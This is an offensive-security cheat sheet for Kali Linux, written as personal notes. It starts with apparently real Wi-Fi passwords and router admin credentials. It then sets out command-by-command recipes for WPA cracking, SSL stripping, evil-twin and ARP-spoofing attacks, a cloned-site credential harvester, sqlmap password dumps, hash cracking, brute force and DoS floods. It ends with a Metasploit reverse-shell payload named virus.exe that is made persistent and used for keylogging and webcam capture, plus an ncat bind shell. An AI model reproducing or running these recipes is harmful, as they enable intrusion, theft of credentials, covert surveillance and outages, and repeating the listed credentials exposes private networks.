# Linux - Hacking com Kali
> Autor: Lucas Joshua Pires


www.exploit-db.com

---------------------------------------------------------------------
## Wireless Access Point ##

	*WiFi (old):
		-name: 		GVT-A9FF
		-passwd: 	J445147905
		-MAC:		4C:09:D4:1A:AA:00
		-IP range:	192.168.25.2-240
		-router:	
			user:	admin
			pass:	gvt12345
		-credentials:
			user: turbonet@turbonet
			pass: @#No password$%
			pass: gvt25
			
	*WiFi:
		-name:		Felix
		-passwd:	ChooseLife
		-MAC:		00:26:24:d0:90:ee
		-IP range:	192.168.0.10-254
		-router:
			user:	hunter
			pass:	whynot
	
	nmap -oG - 192.168.25.1-255 > scan.txt
	nmap -oG - 192.168.0.1-255 > scan.txt
	
---------------------------------------------------------------------

## HACKING BOUNDARIES ##

	*White Hat	
		legal activities
	*Grey Hat	
		boundary between legal/illegal activities
	*Black Hat	
		illegal activities

---------------------------------------------------------------------

## HACK TYPES ##

	*DoS	(Denial of Service)
		single computer

	*DDoS	(Distributed Denial of Service)
		multiple computers
		difficult to detect
		needs a physical router

	*FUD	(Fully UnDetectable program)
		won't be detected by anti-viruses

	*RAT	(Remote Administration Tools)
		Malware that gives the user administrative control of the target 
		difficult to detect

	*Keyloggers
		used to extract information via keyboard
		+100 different options available (can be configured)
		be careful when downloading those!

	*Root kit
		Ex.: Back Orifice
		enables the user to hide processes from task manager

	*Fishing
		attacks that rely on user's first action
		conducted as http (not https)

	*SQL Injections
		attacks that can change something in the SQL database

	*Reverse Shells
		+100 of RS available

---------------------------------------------------------------------

## ANONYMITY ##

	* Proxychains
		routing your connection through different points
		less reliable way to become anonymous

		Types:
		- HTTP		worst one
		- SOCKS4	can be problematic
		- SOCKS5	best one

		How to enable Proxychains:
		1) Open /etc/proxychains.conf with nano
		2) Uncomment 'dynamic_chain' << best
		or Uncomment 'strict_chain'
		or Uncomment 'random_chain'	
		3) Adding a 'lo' proxy:
			socks4	127.0.0.1	9050
			socks5	127.0.0.1	9050
		4) Save and Exit

		OPTIONAL: You can get other proxies @ www.socks-proxy.net
		(Russian Federation and Germany are the best ones)
		Ex.:	socks4	94.180.123.34	1080
				socks5	216.8.240.194	33169
				...
		But do not use too many! Or it'll slow down your connection
		

	* Tor	
		much faster than proxies, but not VPN
		highly unlikely to be detected (99% safe)
		can be used with the Tor browser
		don't ever use Tor with root user!!!

		0) Install Tor
			~ apt-get install tor
		1) Add a new user to the machine
			~ adduser test
		2) Switch to user 'test' (ALWAYS DO THIS)
		3) Download Tor from www.torproject.org
		4) Extract files into a folder
		5) Run /tor-browser_en-US/Browser/start-tor-browser

		Additional commands
		~ service tor status
		~ service tor stop
		~ service tor restart


	* Tor + Proxy:
		(beware of slow browsing!)

		1) Turn it on
			~ service tor start
		2) Run Proxy
			~ proxychains firefox www.duckduckgo.com
		3) Check your DNS now @ www.dnsleaktest.com
		4) Do a Standard Test


	* VPN	(Virtual Private Network)
		become completely anonymous on the web

		1) Check which DNS servers you are using:
			~ cat /etc/resolv.conf
		2) Get a free DNS @ www.opendns.com
			(OPENDNS IP ADDRESSES)
		3) Change your DNS (only 3 can be used at max!):
			~ nano /etc/dhcp/dhclient.conf
			Change	#prepend domain-name-servers 127.0.0.1;
			To	prepend domain-name-servers 208.67.222.222, 208.67.220.220, 8.8.8.8
		4) Restart your NetworkManager
			~ service network-manager restart
		5) Disable webrtc at the browser (Firefox)
			Browse	about:config
			Search	media.peerconnection.enabled
			Set 	Value to False
		6) Open www.vpnbook.com/freevpn
		7) Download anyone you want
		8) Close the browser!
		9) Unzip the file
			~ unzip <filename>.zip
		10) Open the 443 file
			~ openvpn <filename>.ovpn
		11) Open your browser
		12) Check your DNS now @ www.dnsleaktest.com
			Standard Test: ISP must show OpenDNS, LLC!


	* VPS	(Virtual Private Services)
		protects SQL server from outside

---------------------------------------------------------------------

## MACCHANGER ##
	Changing your network hardware's address

	1) Check your current ethernet MAC address
		~macchanger -s eth0
	2) Turn down the network interface
		~ifconfig eth0 down
	3) Change the MAC address to a random address
		~macchanger -r eth0
	4) Bring back up the network interface
		~ifconfig eth0 up

---------------------------------------------------------------------

## FOOTPRINTING ##
	Pre-hacking:
		gather general information about a system
		discover all the open ports

	Types:
		# Active: through social engineering
		# Passive: reviewing a company's website

	Data acquired:	
		- Domain name
		- IP Addresses
		- Namespaces
		- Employee information
		- Phone numbers
		- E-mails

	* Footprinting with websites
		www.lookip.net/whois/"ip_address"

	* Footprinting with Nmap (or Zenmap, the GUI)
		~nmap -v -A scanme.nmap.org
		~nmap -v -sn 192.168.0.0/16 10.0.0.0/8

		1) Scan a range of IP addresses and print the output into a file	
			~nmap -oG - 192.168.1.0-255 -p 22 -vv > /home/SCAN
		2) Read the file and filter your search to get only the IPs
			~cat SCAN | grep Up | awk -F " " '{print $2}'
		(awk -Field "<field_delimiter>" '{print $<field_number>}')
		3) And you can even print it to another file
			~cat SCAN | grep Up | awk -F " " '{print $2}' > SCAN2
		4) Then scan only the addresses that were saved!
			~nmap -iL SCAN2 -vv

		ALSO: Using a (trusty) script with nmap:
			~nmap --script firewall-bypass <target>

	* Footprinting with Nslookup
		~nslookup scanme.nmap.org

	* Footprinting with Curl
		~curl ipinfo.io/74.207.244.221

---------------------------------------------------------------------

## WIRELESS HACKING ##
	WEP	unsafe, and rare to find!
	WPA	safe, and most common!

	Tools:	aircrack-ng
			reaver

	* Using Aircrack:
	1) Change Promiscuous mode to Monitor mode
		~ifconfig wlan0 down
		~iwconfig wlan0 mode monitor
		~ifconfig wlan0 up
	NOTE: Changing it back to Promiscuous mode
		~ifconfig wlan0 promisc
	2) Check which programs may cause trouble with your adapter
		~airmon-ng check wlan0
	or
		~airmon-ng start wlan0
	3) Kill all of the processes (NetworkManager, dhclient, ...)
		~kill <PID>
	4) Check for all the wi-fi networks available
		~airodump-ng wlan0
	5) Scan the selected channel (otherwise it will keep changing!)
		~airodump-ng -c <channel> -w SCAN_test --bssid <MAC> wlan0
	NOTE: You can also change your own channel
		~iwconfig wlan0 channel <number>
	6) Send a DeAuthentication request
		~aireplay-ng -0 0 -a <MAC> wlan0
	NOTE: Must have at least ONE device connected to it!
	7) Cracking the code with CRUNCH (dictionary local attack!)
		~crunch <length> <length> -t <pattern> 1234567890 | aircrack-ng -w <filename.cap> -e <ESSID>
		Options: @ lowercase characters
			, uppercase characters
			% numbers
			^ symbols
		Guess: 	,@@eir@%%%
		Pass:	Madeira123
	or
		~crunch <length> <length> -t <pattern> -f /path/to/charset.lst <charsetname> | aircrack-ng -w <filename.cap> -e <ESSID>

	* Using Reaver
		~reaver -i wlan0 -b <MAC> -vv

---------------------------------------------------------------------

## SSL STRIPS ##
	How to convert HTTPS to HTTP! (removing security of login credentials)

	Tools:	sslstrip
			dsniff
			arpspoof

	0) Install SSLSTRIP
		~apt-get install sslstrip
	1) Change ip_forward from 0 to 1
		~echo 1 > proc/sys/net/ipv4/ip_forward
	2) Configure Firewall port
		~iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
	3) Get the victim's IP and scan it with NMAP
		~ifconfig
		~nmap 192.168.1.2-254 -vv
	4) Spoof in two different terminals!
		~arpspoof -i wlp2s0 -t <default_port> -r <victim_port>
		~arpspoof -i wlan0 -t 192.168.0.1 -r 192.168.0.103
	5) Open port 8080
		~iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
	6) Listen to port 8080
		~sslstrip -l 8080
	7) Provide a live feed of the log file
		~tail -f sslstrip.log

---------------------------------------------------------------------

## FUNNY SCRIPTS ##

	Tools:	squid3
			apache2
			imagemagick
			ghostscript
			jp2a
			arpspoof

	0) Change ip_forward from 0 to 1
		~echo 1 > proc/sys/net/ipv4/ip_forward
	1) Install the following programs
		~apt-get install squid3
		~apt-get install apache2
		~apt-get install imagemagick ghostscript jp2a
	2) Look for a script of your choice (preferably at code.google.com)
		asciiImages.pl
		blurImages.pl
		flipImages.pl or flopImages.pl
		googleSearch.pl
		noInternet.pl
		replaceImages.pl
		replacePages.pl
		rickrollYoutube.pl
		timeMachine.pl
		touretteImages.pl
	3) Open the configuration file
		~nano /etc/squid3/squid.conf
	>Uncomment the lines
		acl localnet src 10.0.0.0/8
		acl localnet src 192.168.0.0/16 (or similar one)
		http_access allow localnet
		http_access allow localhost
	>Add 'transparent' after
		http_port 3128  
	>Add the following to the bottom of the file
		url_rewrite_program /root/path/to/scriptName.pl	
	4) Save (ctrl+O) and exit (ctrl+X)
	5) Restart Squid
		~service squid3 restart
	6) Do that again
		~echo 1 > /proc/sys/net/ipv4/ip_forward
	7) Configure APACHE
		~mkdir /var/www/tmp
		~chmod 777 /var/www/tmp
	8) Restart APACHE
		~service apache2 restart
	9) Spoof!
		~arpspoof -i eth0 -t 192.168.0.1 -r 192.168.0.101

	SPOOF CHECK
		~arp -a
	Check if any MAC ADDRESSES are the same as the default one!

---------------------------------------------------------------------

## EVIL TWIN ## 
	Redirecting website traffic

	Tools:	bridge
			wireshark

	0) Install the required packages
		~apt-get install bridge
		~apt-get install bridge-utils
		~apt-get install wireshark
	1) Create a virtual interface
		~ifconfig wlan0 down
		~iwconfig wlan0 mode monitor
		~airbase-ng -a <MAC> --essid "something" -c 6 wlan0
		~aireplay-ng -0 0 -a
	1) Send deauth requests
		~aireplay-ng -0 0 -a <MAC> wlan0
	3) Add your configurations to Bridge
		~brctl addbr evil
		~brctl addif evil <wirelessinterface>
		~brctl addif evil at0
	4) Turn it up again
		~ifconfig at0 0.0.0.0 up
		~ifconfig evil up
		~dhclient evil
	5) Listen to the traffic
		~wireshark 
	6) Filter by whatever you need
	-POST:
		~http.request.method == "POST"
	-GET:
		~http.request.method == "GET"
	-DNS:
		~dns

---------------------------------------------------------------------

## ATTACKING ROUTERS ##
	Tools: 	nmap

	0) Find the IP Address from the router
		~route
		...on Mac OS X
		~netstat -nr
	1) Scan it with Nmap
		~nmap 192.168.1.1 -vv
	-Go to the IP Address in a browser, to get its model (TD-8840t)
	-Search for the router vulnerabilities at
		www.exploit-db.com
	2) Get the rom file from the router
		~wget http://192.168.1.1/rom-0
	3) Download a Rom Reader file (.py) to open it
		(ZTE, TP-Link, ZynOS, Huawei rom-0 Configuration Decompressor)
	4) Change its permissions and execute it to find the PIN
		~chmod +x RomReader.py
	5) Download some Nmap scripts
		nmap.org/svn/scripts/http-tlink-dir-traversal.nse
		nmap.org/svn/scripts/afp-path-vuln.nse
	AND download the vulns library to /nselib folder
		nmap.org/svn/nselib/vulns.lua
	6) Run the script on the targets IP Address
		~nmap -p80 --script http-tlink-dir-traversal.nse --script-args rfile=/tmp/ath0.ap_bss -d -n -Pn <target>

---------------------------------------------------------------------

## DNS EXPLOITATION ##
	Tools:	dnschef
			setoolkit
	
	0) Discover your own external IP Address
		~ifconfig
	1) Go into the router IP Address and change the DNS to
		Primary DNS Server: <YOUR EXTERNAL IP>
		Secondary DNS Server: 8.8.8.8	
	2) Run Dnschef to redirect a domain
		~dnschef --fakeip=192.168.1.102 --fakedomains=somewebsite.com --interface=192.168.1.102
	3) Run Setoolkit to clone a website into /var/www/
		~setoolkit
		>Social-Engineering Attacks (1)
		>Website Attack Vectors (2)
		>Credential Harvester (3)
		>Site Cloner (2)
	-Input your IP external address
		~192.168.1.102
	-Input the url to clone
		~http://www.fakesite.com
	4) Gather the information at the file located at /var/www
		~tail -f harvester_date_time.txt

---------------------------------------------------------------------

## SQL INJECTION ##
	Tools:	burpsuite	
			sqlmap
			
	0) Start MySQL
	Linux:
		~service mysql start
	OSX:
		~sudo mysql.server start
		
	0) Start Apache
	Linux:
		~sudo apache2 start
	OSX:
		~sudo apachectl start
			
	1) Use Burpsuite to get the url of the server

	2) Check the mysql database schemas using SqlMap
		~sqlmap -u <"url"> --cookie="security=low; PHPSESSID=17dh092730d12h73907h0" --dbs

	3) Retrieve the tables from the DB using SqlMap
		~sqlmap -u <"url"> --cookie="security=low; PHPSESSID=17dh092730d12h73907h0" 
		-D mysql --tables
		-T users --column
		-C user,password --dump

---------------------------------------------------------------------	

## CRACKING HASHES ##
	Tools:	findmyhash
			john
			hydra	

	* Using FindMyHash
		~findmyhash MD5 -h <HASH>

	* Using JohnTheRipper
		0) Look for the passwords file	
			~cat /etc/shadow
		1) Unshadow them into another file
			~unshadow /etc/passwd /etc/shadow > passwords.txt
		2) Crack the hash(es)
			~john passwords.txt
			~john --show passwords.txt
		+ PwDump7 (on Windows!)
			~pwdump7.exe > passwords.txt
			~john.exe --show passwords.txt

	* Using Hydra
		Example:
			~hydra -l <user> -p <pass> <server>
			~hydra -l admin -p password ftp://192.168.0.1
		Example2:
			~hydra -l <user> -P <passFile> <server> http-post-form <"urlField1:urlField2:urlField3"> -V
			~hydra -l admin -P passlist.txt 192.168.0.102 http-post-form "/rest_of_the_url/login.php:username=^USER^&password=^PASS^&Login=Login: Login failed" -V 

---------------------------------------------------------------------	

## DOS ATTACK ##
	Tools:	hping3

	* Hping3
		~hping3 -i <interval in microseconds> -S (sinflag) p <port> <server>
		~hping3 -i u100 -S p 80 192.168.1.1

	* Perl script
		0) Check the DoS category scripts in the Nmap website
			nmap.org/nsedoc/categories/dos.html
		1) Run an Nmap scan on the target server
			~nmap --script http-slowloris --max-parallelism 400 192.168.1.1 -vv
		2) Make the file executable
			~chmod +x slowloris.pl
		3) Run the Perl script
			~./slowloris.pl -dns 192.168.1.1 -port 80 -num 500

---------------------------------------------------------------------	

## REVERSE SHELL ##
	Tools: 	metasploit
			ncat

	* Using Metasploit
		First Terminal:
		0) Use a database for metasploit
			~service postgresql start
		1) Start metasploit
			~service metasploit start
		2) Open metasploit console
			~msfconsole
		OBS.: Update it as much as you can
			~msfupdate
		3) Search for Reverse Shells
			~search -h
			~search name:meterpreter

		Second Terminal:
		1) Create the chosen payload
			~msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.102 x > /root/Desktop/virus.exe
			
		First Terminal:
		1) Handle the selected payload
			~use exploit/multi/handler
			~set payload windows/meterpreter/reverse_tcp
		2) View its options
			~show options
		3) Set the host IP Address
			~set LHOST 192.168.1.102
		4) Start the payload handler
			~exploit
		Once the executable is opened...
		5) Get into the victim's shell
			~shell
		6) Do whatever the hell you want!
			~shutdown /r /t 0
			
		7) Make the session go background
			~background
		
		8) Go back to the started session
		- View started sessions:
			~sessions -l
		- Enter into a session:
			~sessions -i 5
		- Set the session for a command:
			~set session 5

		9) Elevate your priviledges
		- Show commands to elevate priviledges:		
			~use post/windows
			~use post/windows/escalate
			~use post/windows/escalate/getsystem
		
		- Ask user for admin priviledges:
			~use exploit/windows/local/ask
			~exploit
			~getsystem
			
		10) Make Persistent Reverse Shell
			~run persistence -h
			~run persistence -X
			
		11) Exploit more!!!
		- Keyboard Commands:
			~keyscan_dump
			~keyscan_start
			~keyscan_stop
		
		- Interface Commands:
			~screenshot
			~record_mic
		
		- Webcam Commands:
			~webcam_chat
			~webcam_list
			~webcam_snap
			~webcam_stream
		
	* Using NetCat
		- See the possible options
			~ncat -h
		- Executing a command
			~ncat -v -l -p 8888 -e /bin/bash
			...on Windows:
			~nc -v -l -n -p 8888 -e cmd.exe
		- Connect to an IP address
			~ncat 192.168.1.102 8888
			...w/ encryption:
			~ncat --ssl 192.168.1.102 8888
			
		- Listen to a Port
		1) See which processes use a specific port
			~lsof -i :8888
		2) Kill the open processes
			~kill <PID1> <PID2>
		3) Chatting (listen to a port)
			~ncat -l -p 8888
		4) Encrypted Chatting
			~ncat --ssl -l -p 8888
		5) Multiple Encrypted Chatting
			~ncat --ssl -l -k -p 8888
		
	